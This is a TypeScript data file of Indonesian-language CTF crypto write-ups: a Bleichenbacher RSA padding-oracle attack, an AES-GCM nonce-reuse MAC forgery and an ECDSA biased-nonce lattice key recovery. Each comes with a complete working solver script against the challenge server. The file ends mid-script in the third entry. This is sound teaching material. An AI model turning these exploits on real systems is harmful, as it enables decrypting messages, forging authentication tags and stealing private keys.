import type { WriteUp } from "../types";

export const thjccSummerWriteups: WriteUp[] = [
  {
    "id": "thjccsummer-crypto-amillionmessages",
    "title": "Laporan Analisis Kerentanan: A Million Messages",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "**Kategori:** Cryptography\n**Vulnerability:** RSA PKCS#1 v1.5 Padding Oracle (Bleichenbacher 1998 / BB98)\n**Tingkat Kesulitan:** Menengah – Mahir",
    "problemDescription": "**Kategori:** Cryptography\n**Vulnerability:** RSA PKCS#1 v1.5 Padding Oracle (Bleichenbacher 1998 / BB98)\n**Tingkat Kesulitan:** Menengah – Mahir",
    "tools": [],
    "analysis": "Koneksi awal ke:\n\n```text\nchal.thjcc.org:12003\n```\n\nmemberikan parameter berikut:\n\n| Parameter             | Nilai               |\n| --------------------- | ------------------- |\n| Modulus (`N`)         | 512-bit (64 bytes)  |\n| Public Exponent (`E`) | `65537` (`0x10001`) |\n| Ciphertext (`C`)      | 512-bit             |\n\nModulus `N` dihasilkan secara acak pada setiap sesi koneksi.\n\nKarakteristik dinamis tersebut mencegah penggunaan metode kriptanalisis luring seperti faktorisasi menggunakan **General Number Field Sieve (GNFS)** melalui CADO-NFS atau pencarian pada basis data seperti FactorDB.\n\nOleh karena itu, serangan interaktif secara langsung terhadap server merupakan rute eksploitasi yang valid.\n\n### Validasi Input\n\nServer mengharuskan payload memiliki format:\n\n* Tepat **128 karakter hexadecimal**\n* Merepresentasikan **64 bytes**\n* Diakhiri karakter newline (`\\n`)\n\nKegagalan memenuhi format tersebut dapat menyebabkan server memutus koneksi akibat *exception handling* yang tidak memadai.\n\n---\n\nKerentanan berakar pada cara standar **RSA PKCS#1 v1.5** memformat data sebelum operasi matematis RSA dilakukan.\n\n### 3.1. Struktur Padding PKCS#1 v1.5\n\nUntuk modulus RSA dengan panjang `k` byte, plaintext sebelum operasi RSA memiliki struktur:\n\n```text\n0x00 || 0x02 || PS || 0x00 || M\n```\n\ndengan:\n\n* `0x00` dan `0x02`: penanda blok untuk mode enkripsi.\n* `PS`: *Padding String* yang terdiri dari byte acak non-zero dengan panjang minimal 8 byte.\n* `0x00`: byte separator.\n* `M`: plaintext atau pesan sebenarnya.\n\nDalam representasi integer, blok yang memenuhi dua byte awal `0x00 0x02` berada pada interval:\n\n$$\n2B \\leq m < 3B\n$$\n\ndengan:\n\n$$\nB = 2^{8(k-2)}\n$$\n\n---\n\n### 3.2. Sifat Homomorfik Multiplikatif RSA\n\nRSA murni memiliki sifat homomorfik multiplikatif.\n\nJika:\n\n$$\nC = m^E \\pmod N\n$$\n\nmaka penyerang dapat membentuk ciphertext baru:\n\n$$\nC' = C \\cdot s^E \\pmod N\n$$\n\nyang ketika didekripsi menghasilkan:\n\n$$\nm' = m \\cdot s \\pmod N\n$$\n\nSecara lengkap:\n\n$$\nC' = C \\cdot s^E\n$$\n\n$$\n= m^E \\cdot s^E\n$$\n\n$$\n= (m \\cdot s)^E \\pmod N\n$$\n\nDengan demikian, penyerang dapat memanipulasi plaintext hasil dekripsi secara tidak langsung tanpa mengetahui private key.\n\n---\n\n### 3.3. Algoritma Pencarian Interval BB98\n\nServer bertindak sebagai **oracle** berdasarkan validitas padding.\n\nJika ciphertext hasil manipulasi menghasilkan respons `BAD`, maka nilai:\n\n$$\nm \\cdot s \\pmod N\n$$\n\nberada di luar interval PKCS#1 v1.5 yang valid.\n\nSebaliknya, apabila server memberikan respons non-`BAD`, penyerang memperoleh informasi bahwa:\n\n$$\n2B \\leq (m \\cdot s \\pmod N) < 3B\n$$\n\nInformasi satu-bit tersebut dapat digunakan secara iteratif untuk mempersempit himpunan kemungkinan nilai plaintext.\n\nAlgoritma Bleichenbacher 1998 secara umum terdiri dari beberapa fase:\n\n1. **Blinding**\n   Dilakukan apabila ciphertext awal belum diketahui sebagai ciphertext yang memenuhi format PKCS#1 v1.5.\n\n2. **Pencarian awal (`s₁`)**\n   Mencari nilai integer `s₁` yang menghasilkan plaintext dengan struktur padding valid.\n\n3. **Pencarian lanjutan**\n   Setelah `s₁` ditemukan, pencarian nilai `s` berikutnya dapat dibatasi pada rentang yang semakin sempit.\n\n4. **Penyempitan interval**\n   Berdasarkan nilai `s` yang valid, kemungkinan nilai plaintext dihitung ulang dan interval kandidat dipersempit.\n\n5. **Konvergensi**\n   Iterasi dilanjutkan hingga interval kandidat hanya menyisakan satu nilai plaintext.\n\n---\n\nSkrip hasil optimasi dapat berjalan dengan penggunaan memori yang jauh lebih stabil.\n\nStatistik eksekusi:\n\n| Parameter         | Hasil                             |\n| ----------------- | --------------------------------- |\n| Metode I/O        | Python `socket`                   |\n| Ukuran modulus    | 512-bit                           |\n| `E`               | `65537`                           |\n| Penemuan `s₁`     | Iterasi ke-20.785                 |\n| Nilai `s₁`        | `20785`                           |\n| Konvergensi akhir | Interval memiliki selisih `0` bit |\n\nNilai pivot pertama yang menghasilkan plaintext dengan padding valid ditemukan pada:\n\n$$\ns_1 = 20785\n$$\n\nSetelah nilai tersebut ditemukan, proses penyempitan interval berlangsung jauh lebih cepat. Setiap iterasi mengurangi ruang kemungkinan plaintext hingga akhirnya hanya tersisa satu nilai absolut.\n\n---",
    "solution": [
      {
        "title": "1. Tinjauan Umum",
        "content": "Tantangan **\"A Million Messages\"** mensimulasikan sebuah server yang mengimplementasikan protokol dekripsi RSA. Pengguna diberikan akses ke soket TCP yang secara dinamis menghasilkan parameter kunci publik berupa **Modulus (`N`)**, **Eksponen (`E`)**, serta sebuah **Ciphertext (`C`)** yang menyimpan pesan rahasia (*flag*).\n\nInteraksi dengan server mengungkapkan bahwa aplikasi mengembalikan pesan kesalahan spesifik (`BAD`) ketika menerima ciphertext yang hasil dekripsinya tidak memiliki struktur padding PKCS#1 v1.5 yang valid.\n\nPerilaku tersebut menciptakan kerentanan **Padding Oracle**, yang memungkinkan penyerang merekonstruksi plaintext asli tanpa perlu mengetahui private key (`d`) atau melakukan faktorisasi terhadap modulus `N`.\n\n---"
      },
      {
        "title": "4. Metodologi Serangan dan Eksekusi",
        "content": "### 4.1. Kendala Teknis dan Optimasi I/O\n\nImplementasi awal menggunakan framework **pwntools** mengalami kegagalan pada fase pencarian awal.\n\nFase tersebut membutuhkan sejumlah besar request ke server. Overhead logging dan pengelolaan objek koneksi menyebabkan penggunaan memori meningkat secara signifikan hingga proses Python dihentikan oleh **Out-Of-Memory (OOM) Killer**.\n\nUntuk mengatasi masalah tersebut, implementasi kemudian ditulis ulang menggunakan modul `socket` bawaan Python.\n\nKomunikasi I/O menggunakan buffer minimal melalui objek:\n\n```python\nmakefile(\"rw\", buffering=1)\n```\n\nPendekatan tersebut mengurangi overhead yang tidak diperlukan dan memungkinkan proses pencarian berjalan lebih stabil.\n\n---\n\n### 4.2. Potongan Logika Eksploitasi\n\nKonstanta awal dan interval kandidat dapat dihitung sebagai berikut:\n\n```python\nk = (N.bit_length() + 7) // 8\nB = 2 ** (8 * (k - 2))\n\nM = [(2 * B, 3 * B - 1)]\ns_val = 1\n```\n\nPencarian awal terhadap `s₁`:\n\n```python\ns_val = ceil_div(N, 3 * B)\n\nwhile True:\n    c_test = (C * pow(s_val, E, N)) % N\n\n    if oracle(c_test):\n        break\n\n    s_val += 1\n```\n\nSetelah nilai `s` yang valid ditemukan, interval kandidat diperbarui:\n\n```python\nM_new = []\n\nfor a, b in M:\n    r_min = ceil_div(a * s_val - 3 * B + 1, N)\n    r_max = (b * s_val - 2 * B) // N\n\n    for r_val in range(r_min, r_max + 1):\n        lower = max(\n            a,\n            ceil_div(2 * B + r_val * N, s_val)\n        )\n\n        upper = min(\n            b,\n            (3 * B - 1 + r_val * N) // s_val\n        )\n\n        if lower <= upper:\n            M_new.append((lower, upper))\n```\n\nInterval yang dihasilkan kemudian diurutkan dan digabungkan (*merge*) untuk menghilangkan irisan yang tumpang tindih.\n\n---"
      },
      {
        "title": "5. Hasil Dekripsi",
        "content": "Hasil akhir algoritma berupa sebuah integer yang merepresentasikan plaintext ter-*encode* dalam bentuk blok PKCS#1 v1.5.\n\nSetelah dikonversi kembali menjadi byte, diperoleh:\n\n```text\n\\x02O6\\xa9gj\\x923\\x96A\\xc9\\xd7\\x19\\xad\\xe7\\x8f\\xe8M\\r\\x00THJCC{bl31chenb4ch3r_st1ll_3ats_pkcs1_v1_5}\n```\n\nStruktur byte tersebut sesuai dengan format padding yang diharapkan.\n\nSecara konseptual, strukturnya adalah:\n\n```text\n\\x02\n    └── Padding String\n        └── \\x00\n            └── Message / Flag\n```\n\nByte `\\x00` di awal blok tidak terlihat pada representasi tertentu karena konversi integer-ke-byte dapat menghilangkan leading zero.\n\nSetelah padding dan separator dipotong hingga byte `\\x00`, diperoleh plaintext:\n\n```text\nTHJCC{bl31chenb4ch3r_st1ll_3ats_pkcs1_v1_5}\n```\n\n### Flag\n\n```text\nTHJCC{bl31chenb4ch3r_st1ll_3ats_pkcs1_v1_5}\n```\n\n---"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import socket\r\nimport sys\r\nfrom Crypto.Util.number import long_to_bytes\r\n\r\nHOST = 'chal.thjcc.org'\r\nPORT = 12003\r\n\r\ndef ceil_div(a, b):\r\n    return (a + b - 1) // b\r\n\r\ndef do_attack():\r\n    print(f\"[*] Menyambungkan ke {HOST}:{PORT}...\")\r\n    \r\n    # Menggunakan TCP Socket murni agar I/O ultra-ringan tanpa memori bocor\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    sock.connect((HOST, PORT))\r\n    \r\n    # Membuat objek file-like untuk membaca & menulis per baris\r\n    f = sock.makefile('rw', buffering=1) \r\n    \r\n    try:\r\n        # Membaca N, E, C dari server\r\n        line_N = f.readline().strip()\r\n        N = int(line_N.split(' ')[1], 16)\r\n        \r\n        line_E = f.readline().strip()\r\n        E = int(line_E.split(' ')[1], 16)\r\n        \r\n        line_C = f.readline().strip()\r\n        C = int(line_C.split(' ')[1], 16)\r\n        \r\n        print(\"[+] Parameter berhasil didapatkan!\")\r\n        k = (N.bit_length() + 7) // 8\r\n        B = 2 ** (8 * (k - 2))\r\n        \r\n        queries = 0\r\n        def oracle(c_test):\r\n            nonlocal queries\r\n            queries += 1\r\n            \r\n            if queries % 1000 == 0:\r\n                print(f\"[*] Jumlah query ke server sejauh ini: {queries} ...\")\r\n                \r\n            # Kirim payload format 128 karakter hex + newline\r\n            payload = hex(c_test)[2:].zfill(128) + '\\n'\r\n            f.write(payload)\r\n            \r\n            res = f.readline().strip()\r\n            if not res:\r\n                print(\"\\n[-] Server memutus koneksi!\")\r\n                sys.exit(1)\r\n            \r\n            if \"BAD\" in res:\r\n                return False\r\n            return True\r\n\r\n        print(\"\\n[*] Memulai Bleichenbacher's 1998 Padding Oracle Attack...\")\r\n        print(\"[*] Versi Socket (Ultra-Ringan) - Bebas OOM Killer.\")\r\n        \r\n        M = [(2 * B, 3 * B - 1)]\r\n        i = 1\r\n        s_val = 1\r\n        \r\n        while True:\r\n            if i == 1:\r\n                print(\"[*] Step 2a: Mencari s1 awal (Sekitar 30k-70k query)...\")\r\n                s_val = ceil_div(N, 3 * B)\r\n                while True:\r\n                    c_test = (C * pow(s_val, E, N)) % N\r\n                    if oracle(c_test):\r\n                        break\r\n                    s_val += 1\r\n                print(f\"\\n[+] s1 berhasil ditemukan: {s_val}\")\r\n                \r\n            elif len(M) >= 2:\r\n                s_val += 1\r\n                while True:\r\n                    c_test = (C * pow(s_val, E, N)) % N\r\n                    if oracle(c_test):\r\n                        break\r\n                    s_val += 1\r\n                    \r\n            elif len(M) == 1:\r\n                a, b = M[0]\r\n                if a == b:\r\n                    break # Plaintext ditemukan!\r\n                \r\n                r_i = ceil_div(2 * (b * s_val - 2 * B), N)\r\n                found = False\r\n                while not found:\r\n                    s_min = ceil_div(2 * B + r_i * N, b)\r\n                    s_max = (3 * B - 1 + r_i * N) // a\r\n                    for s_test in range(s_min, s_max + 1):\r\n                        c_test = (C * pow(s_test, E, N)) % N\r\n                        if oracle(c_test):\r\n                            s_val = s_test\r\n                            found = True\r\n                            break\r\n                    if not found:\r\n                        r_i += 1\r\n                        \r\n            # Step 3: Narrowing the set of solutions (Penyempitan)\r\n            M_new = []\r\n            for a, b in M:\r\n                r_min = ceil_div(a * s_val - 3 * B + 1, N)\r\n                r_max = (b * s_val - 2 * B) // N\r\n                for r_val in range(r_min, r_max + 1):\r\n                    lower = max(a, ceil_div(2 * B + r_val * N, s_val))\r\n                    upper = min(b, (3 * B - 1 + r_val * N) // s_val)\r\n                    if lower <= upper:\r\n                        M_new.append((lower, upper))\r\n                        \r\n            # Merge interval yang tumpang tindih\r\n            M_new.sort()\r\n            M_merged = []\r\n            for interval in M_new:\r\n                if not M_merged:\r\n                    M_merged.append(interval)\r\n                else:\r\n                    last = M_merged[-1]\r\n                    if interval[0] <= last[1] + 1:\r\n                        M_merged[-1] = (last[0], max(last[1], interval[1]))\r\n                    else:\r\n                        M_merged.append(interval)\r\n            M = M_merged\r\n            \r\n            # Cek status penemuan flag\r\n            if len(M) == 1:\r\n                a, b = M[0]\r\n                bit_diff = (b - a).bit_length()\r\n                print(f\"[*] Lebar tebakan tersisa mengerucut: {bit_diff} bits\")\r\n                if a == b:\r\n                    print(\"\\n[+] Plaintext berhasil dikalkulasi secara matematis!\")\r\n                    break\r\n                    \r\n            i += 1\r\n\r\n        # Format Flag PKCS#1 v1.5\r\n        m = M[0][0]\r\n        raw_bytes = long_to_bytes(m)\r\n        print(f\"\\nRaw Decrypted Bytes: {raw_bytes}\")\r\n        \r\n        if b'\\x00' in raw_bytes[2:]:\r\n            flag = raw_bytes[raw_bytes.index(b'\\x00', 2) + 1:]\r\n            print(f\"\\n🚩 FLAG: {flag.decode('utf-8', errors='ignore')}\")\r\n        else:\r\n            print(\"[-] Gagal menemukan separator padding. String mentah:\")\r\n            print(raw_bytes.decode('utf-8', errors='ignore'))\r\n            \r\n    except Exception as e:\r\n        print(f\"\\n[!] Error tak terduga: {e}\")\r\n    finally:\r\n        sock.close()\r\n\r\nif __name__ == '__main__':\r\n    do_attack()"
      }
    ],
    "terminalOutputs": [],
    "flag": "x00THJCC{bl31chenb4ch3r_st1ll_3ats_pkcs1_v1_5}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-crypto-forbidden",
    "title": "Writeup CTF: Forbidden",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge Writeup CTF: Forbidden",
    "problemDescription": "Diberikan sebuah endpoint netcat. Saat diakses, server memberikan satu nilai `NONCE`, tiga blok pesan (masing-masing berisi Plaintext, Ciphertext, dan MAC/Tag), serta satu `TARGET` berupa plaintext. Tujuan kita adalah mengenkripsi plaintext `TARGET` tersebut dan membuat MAC yang valid agar diterima oleh server.\n\nKerentanan utama terletak pada penggunaan nilai `NONCE` yang sama persis untuk mengenkripsi tiga pesan yang berbeda. Ini adalah implementasi kerentanan klasik yang dikenal sebagai **Forbidden Attack** pada AES-GCM.",
    "tools": [],
    "analysis": "AES-GCM (Galois/Counter Mode) terdiri dari dua komponen utama: enkripsi berbasis stream cipher (CTR mode) dan autentikasi berbasis fungsi hash universal (GHASH).\n\n### 1. Kerentanan Enkripsi (Keystream Reuse)\n\nPada mode CTR, ciphertext dihasilkan dengan melakukan operasi XOR antara plaintext dengan keystream. Keystream dihasilkan dari enkripsi nilai counter (yang diturunkan dari Nonce dan Kunci) menggunakan AES.\n\n$$CT = PT \\oplus Keystream$$\n\nKarena Nonce tidak berubah pada ketiga pesan, keystream yang dihasilkan juga identik. Hal ini memungkinkan kita untuk memulihkan keystream hanya dengan melakukan XOR antara Plaintext dan Ciphertext dari salah satu pesan yang diberikan.\n\n$$Keystream = PT_1 \\oplus CT_1$$\n\nSetelah keystream didapatkan, kita dapat langsung mengenkripsi plaintext TARGET.\n\n$$CT_{target} = PT_{target} \\oplus Keystream$$\n\n### 2. Kerentanan Autentikasi (GHASH Key Recovery)\n\nAutentikasi pada GCM dihitung menggunakan fungsi GHASH beroperasi pada Galois Field $GF(2^{128})$ dengan polinomial tak tereduksi $x^{128} + x^7 + x^2 + x + 1$.\n\nSecara matematis, Tag (T) atau MAC dihasilkan dari persamaan:\n\n$$T = GHASH(H, A, C) \\oplus S$$\n\nDi mana:\n\n- $H$ adalah Hash Key (nilai turunan dari Kunci master AES).\n- $A$ adalah Additional Authenticated Data (pada kasus ini kosong).\n- $C$ adalah Ciphertext.\n- $S$ adalah Masking Key, dihitung dengan mengenkripsi blok awal (J0) yang diturunkan dari Nonce.\n\nKarena Nonce yang digunakan sama, nilai $S$ akan identik untuk semua pesan. Dalam aritmatika GF(2), operasi penambahan ekuivalen dengan XOR. Jika kita menjumlahkan Tag dari pesan 1 dan pesan 2, nilai $S$ akan saling meniadakan ($S \\oplus S = 0$).\n\n$$T_1 + T_2 = (GHASH(H, C_1) + S) + (GHASH(H, C_2) + S)$$\n\n$$T_1 + T_2 = GHASH(H, C_1) + GHASH(H, C_2)$$\n\nFungsi GHASH pada dasarnya adalah evaluasi polinomial di mana elemen datanya menjadi koefisien dan $H$ adalah variabelnya. Persamaan di atas dapat disusun ulang menjadi persamaan polinomial dengan variabel bebas $X$:\n\n$$P_1(X) = GHASH(X, C_1) + GHASH(X, C_2) + T_1 + T_2 = 0$$\n\nNilai rahasia $H$ adalah salah satu akar dari polinomial $P_1(X)$. Karena polinomial ini bisa memiliki banyak akar, kita membutuhkan polinomial kedua untuk mencari irisan akarnya. Kita gunakan kombinasi pesan 1 dan pesan 3:\n\n$$P_2(X) = GHASH(X, C_1) + GHASH(X, C_3) + T_1 + T_3 = 0$$\n\nDengan menggunakan algoritma Euclidean untuk mencari Greatest Common Divisor (GCD) dari $P_1(X)$ dan $P_2(X)$, kita dapat mengeliminasi akar-akar palsu.\n\n$$P_{gcd}(X) = GCD(P_1(X), P_2(X))$$\n\nAkar dari $P_{gcd}(X)$ adalah nilai Hash Key ($H$) yang sebenarnya. Setelah $H$ diketahui, kita bisa mendapatkan kembali nilai Masking Key ($S$) menggunakan salah satu pesan asli:\n\n$$S = T_1 + GHASH(H, C_1)$$\n\nDengan $H$ dan $S$ di tangan, kita memegang kendali penuh atas komponen autentikasi GCM dan dapat membuat Tag/MAC yang valid untuk $CT_{target}$.",
    "solution": [
      {
        "title": "Eksploitasi",
        "content": "Eksploitasi dilakukan menggunakan SageMath karena kemampuannya dalam menangani operasi polinomial pada field berhingga (Finite Fields) dengan presisi mutlak.\n\nHal yang perlu diperhatikan dalam implementasi spesifikasi GCM adalah konversi bit. Standar NIST mengharuskan bit direpresentasikan dengan format Little-Endian bit ordering saat dikonversi ke elemen polinomial GF(2^128). Ini ditangani oleh fungsi kustom `bytes_to_elem` dan `elem_to_bytes` pada skrip penyelesaian."
      },
      {
        "title": "Script Penyelesaian (SageMath)",
        "content": "```python\nimport socket\nimport operator\n\ndef solve():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('chal.thjcc.org', 12002))\n\n    lines = []\n    for _ in range(5):\n        buf = b\"\"\n        while b\"\\n\" not in buf:\n            buf += s.recv(1)\n        lines.append(buf.decode().strip())\n    \n    msg1 = lines[1].split()\n    msg2 = lines[2].split()\n    msg3 = lines[3].split()\n    target_line = lines[4].split()\n\n    pt1, ct1, mac1 = [bytes.fromhex(x) for x in msg1[1:]]\n    pt2, ct2, mac2 = [bytes.fromhex(x) for x in msg2[1:]]\n    pt3, ct3, mac3 = [bytes.fromhex(x) for x in msg3[1:]]\n    target_pt = bytes.fromhex(target_line[1])\n\n    # 1. Recover Keystream\n    ks = bytes([operator.xor(a, b) for a, b in zip(pt1, ct1)])\n    target_ct = bytes([operator.xor(a, b) for a, b in zip(target_pt, ks[:len(target_pt)])])\n\n    # 2. Setup Finite Field GF(2^128)\n    from sage.all import GF, PolynomialRing\n    F = GF(2**128, name='a', modulus=PolynomialRing(GF(2), 'x')('x^128 + x^7 + x^2 + x + 1'))\n    PR = PolynomialRing(F, name='X')\n    X = PR.gen()\n\n    def bytes_to_elem(b):\n        num = int.from_bytes(b, 'big')\n        num = int('{:0128b}'.format(num)[::-1], 2)\n        bits = [(num >> i) & 1 for i in range(128)]\n        return F(bits)\n\n    def elem_to_bytes(e):\n        coeffs = e.polynomial().list()\n        num = sum(int(c) << i for i, c in enumerate(coeffs))\n        num = int('{:0128b}'.format(num)[::-1], 2)\n        return num.to_bytes(16, 'big')\n\n    def get_ghash_poly(C):\n        C_pad = C + b'\\x00' * ((16 - len(C) % 16) % 16)\n        blocks = [C_pad[i:i+16] for i in range(0, len(C_pad), 16)]\n        len_block = (0).to_bytes(8, 'big') + (len(C) * 8).to_bytes(8, 'big')\n        blocks.append(len_block)\n\n        poly = PR(0)\n        for i, b in enumerate(reversed(blocks)):\n            poly += bytes_to_elem(b) * (X**(i+1))\n        return poly\n\n    def ghash(H_val, C):\n        C_pad = C + b'\\x00' * ((16 - len(C) % 16) % 16)\n        blocks = [C_pad[i:i+16] for i in range(0, len(C_pad), 16)]\n        len_block = (0).to_bytes(8, 'big') + (len(C) * 8).to_bytes(8, 'big')\n        blocks.append(len_block)\n\n        Y = F(0)\n        for b in blocks:\n            Y = (Y + bytes_to_elem(b)) * H_val\n        return Y\n\n    # 3. Construct polynomials and find roots\n    P1 = get_ghash_poly(ct1) + get_ghash_poly(ct2) + bytes_to_elem(mac1) + bytes_to_elem(mac2)\n    P2 = get_ghash_poly(ct1) + get_ghash_poly(ct3) + bytes_to_elem(mac1) + bytes_to_elem(mac3)\n\n    P_gcd = P1.gcd(P2)\n    roots = P_gcd.roots()\n    H = roots[0][0]\n\n    # 4. Recover S and Forge MAC\n    S = bytes_to_elem(mac1) + ghash(H, ct1)\n    target_mac_elem = ghash(H, target_ct) + S\n    target_mac = elem_to_bytes(target_mac_elem)\n\n    payload = f\"{target_ct.hex()} {target_mac.hex()}\"\n    s.sendall((payload + '\\n').encode())\n\n    print(s.recv(1024).decode().strip())\n\nif __name__ == '__main__':\n    solve()\n```"
      },
      {
        "title": "Hasil",
        "content": "Setelah skrip dijalankan, server memvalidasi Tag palsu yang dikirim dan mengembalikan flag:\n\n```\nTHJCC{h_r3c0v3r3d_gcm_1s_f0rb1dd3n_w1th0ut_fr3sh_n0nc3s}\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "CT_{target}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-crypto-latticeofdoom",
    "title": "Lattice of Doom — Writeup",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge Lattice of Doom — Writeup",
    "problemDescription": "`signer_excerpt.py` membocorkan sumber masalahnya:\n\n```\nNONCE_BYTES = 29\nk = int.from_bytes(trng.read(NONCE_BYTES), \"big\")\n```\n\nECDSA secp256k1 normalnya bekerja modulo order `n` berukuran 256 bit. Nonce di sini hanya 29 byte, sehingga:\n\n```\nk < 2^(29*8) = 2^232\n```\n\nArtinya, 24 bit teratas nonce selalu nol. Satu signature hanya membocorkan sedikit informasi, tetapi 60 signature cukup untuk mengubahnya menjadi Hidden Number Problem (HNP) dan menyelesaikannya menggunakan lattice reduction.\n\nFlag terenkripsi di `output.json` memakai AES-128-CBC. Key berasal dari private scalar `d`:\n\n```\nkey = sha256(b'wallet-v1|' + d.to_bytes(32,'big'))[:16]\n```\n\nJadi targetnya adalah mengambil `d`, kemudian melakukan key derivation dan mendekripsi flag.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Persamaan ECDSA",
        "content": "Signature ECDSA memiliki bentuk:\n\n```\ns = k^(-1) * (z + r*d) mod n\n```\n\ndengan:\n\n- `d` = private key\n- `k` = nonce\n- `z` = SHA-256(message) sebagai integer\n- `(r, s)` = signature\n- `n` = order secp256k1\n\nPersamaan tersebut dapat dibalik menjadi:\n\n```\ns*k = z + r*d mod n\nk = s^(-1)*z + s^(-1)*r*d mod n\n```\n\nDefinisikan:\n\n```\nt_i = r_i * s_i^(-1) mod n\nu_i = z_i * s_i^(-1) mod n\n```\n\nMaka untuk setiap signature:\n\n```\nk_i = t_i*d + u_i mod n\n```\n\nKarena firmware memaksa:\n\n```\nk_i < 2^232\n```\n\nkita memiliki banyak nilai modular yang hasilnya harus kecil. Inilah bentuk Hidden Number Problem."
      },
      {
        "title": "Lattice yang Dipakai",
        "content": "Untuk setiap signature berlaku:\n\n```\nq_i*n + t_i*d + u_i = k_i\n```\n\nNilai `q_i` dan `d` tidak diketahui, tetapi `k_i` diketahui memiliki batas kecil.\n\nSolver membangun lattice embedding yang mencari vektor pendek:\n\n```\n(k_1*n, k_2*n, ..., k_m*n, d*B, B*n)\n```\n\ndengan:\n\n```\nB = 2^232\n```\n\nMatrix integer yang digunakan adalah:\n\n```\nn^2   0     0    ...  0     0    0\n0     n^2   0    ...  0     0    0\n0     0     n^2  ...  0     0    0\n...                         ...\nt1*n t2*n  t3*n  ... tm*n  B    0\nu1*n u2*n  u3*n  ... um*n  0    B*n\n```\n\nSetelah LLL, baris pendek dengan koordinat terakhir ±B*n dicek. Koordinat sebelum terakhir harus merupakan kelipatan B, kemudian:\n\n```\nd = vector[-2] / B mod n\n```\n\nKandidat tidak langsung dipercaya. Solver melakukan dua validasi:\n\n1. Semua nonce hasil rekonstruksi memenuhi `k_i < B`.\n2. `d * G` sama dengan public key `(Qx, Qy)` dari `output.json`.\n\nDengan 12 signature pertama, LLL sudah cukup untuk memulihkan private scalar."
      },
      {
        "title": "Hasil Recovery",
        "content": "Private key yang ditemukan:\n\n```\na808ed16f3523aa75d754fef34d4247f4eebbc33ba38729e0c151149f7bb37a2\n```\n\nOutput solver:\n\n```\n[+] recovered d using 12 signatures\n[+] d = a808ed16f3523aa75d754fef34d4247f4eebbc33ba38729e0c151149f7bb37a2\n<FLAG>THJCC{l4tt1c3s_turn_b14s3d_n0nc3s_1nt0_pr1v4t3_k3ys}</FLAG>\n```"
      },
      {
        "title": "Cara Menjalankan",
        "content": "Dari folder yang berisi `output.json`:\n\n```\npython3 solve.py\n```\n\nJika dependency AES yang tersedia adalah `pycryptodome`, script akan menggunakannya. Jika tidak tersedia, script memiliki fallback ke `cryptography`."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport json\r\nimport hashlib\r\nfrom pathlib import Path\r\n\r\ntry:\r\n    from sympy import Matrix\r\nexcept ImportError as e:\r\n    raise SystemExit(\"sympy is required for LLL: pip install sympy\") from e\r\n\r\n# secp256k1 parameters\r\nP = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F\r\nN = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141\r\nGx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798\r\nGy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8\r\nG = (Gx, Gy)\r\n\r\nNONCE_BYTES = 29\r\nB = 1 << (8 * NONCE_BYTES)   # nonce bound: k < 2^232\r\n\r\n\r\ndef inv_mod(a, m):\r\n    return pow(a, -1, m)\r\n\r\n\r\ndef sha256_int(msg: bytes) -> int:\r\n    return int.from_bytes(hashlib.sha256(msg).digest(), \"big\")\r\n\r\n\r\ndef ec_add(a, b):\r\n    if a is None:\r\n        return b\r\n    if b is None:\r\n        return a\r\n    x1, y1 = a\r\n    x2, y2 = b\r\n    if x1 == x2 and (y1 + y2) % P == 0:\r\n        return None\r\n    if a == b:\r\n        lam = (3 * x1 * x1) * inv_mod(2 * y1 % P, P) % P\r\n    else:\r\n        lam = (y2 - y1) * inv_mod((x2 - x1) % P, P) % P\r\n    x3 = (lam * lam - x1 - x2) % P\r\n    y3 = (lam * (x1 - x3) - y1) % P\r\n    return (x3, y3)\r\n\r\n\r\ndef ec_mul(k, point=G):\r\n    out = None\r\n    addend = point\r\n    while k:\r\n        if k & 1:\r\n            out = ec_add(out, addend)\r\n        addend = ec_add(addend, addend)\r\n        k >>= 1\r\n    return out\r\n\r\n\r\ndef unpad_pkcs7(data: bytes) -> bytes:\r\n    if not data:\r\n        raise ValueError(\"empty plaintext\")\r\n    pad = data[-1]\r\n    if pad < 1 or pad > 16 or data[-pad:] != bytes([pad]) * pad:\r\n        raise ValueError(\"bad PKCS#7 padding\")\r\n    return data[:-pad]\r\n\r\n\r\ndef aes_cbc_decrypt(key: bytes, iv: bytes, ct: bytes) -> bytes:\r\n    # Prefer pycryptodome on a normal CTF box; fall back to cryptography.\r\n    try:\r\n        from Crypto.Cipher import AES\r\n        return AES.new(key, AES.MODE_CBC, iv).decrypt(ct)\r\n    except Exception:\r\n        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\r\n        dec = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()\r\n        return dec.update(ct) + dec.finalize()\r\n\r\n\r\ndef build_lattice(signatures):\r\n    \"\"\"\r\n    ECDSA gives: s_i*k_i = z_i + r_i*d mod n.\r\n    So k_i = t_i*d + u_i mod n, where:\r\n      t_i = r_i/s_i mod n\r\n      u_i = z_i/s_i mod n\r\n\r\n    Firmware uses 29-byte nonces, so every k_i is below B = 2^232.\r\n    This is a Hidden Number Problem instance. The matrix below is the standard\r\n    embedding/CVP trick, scaled by n to keep 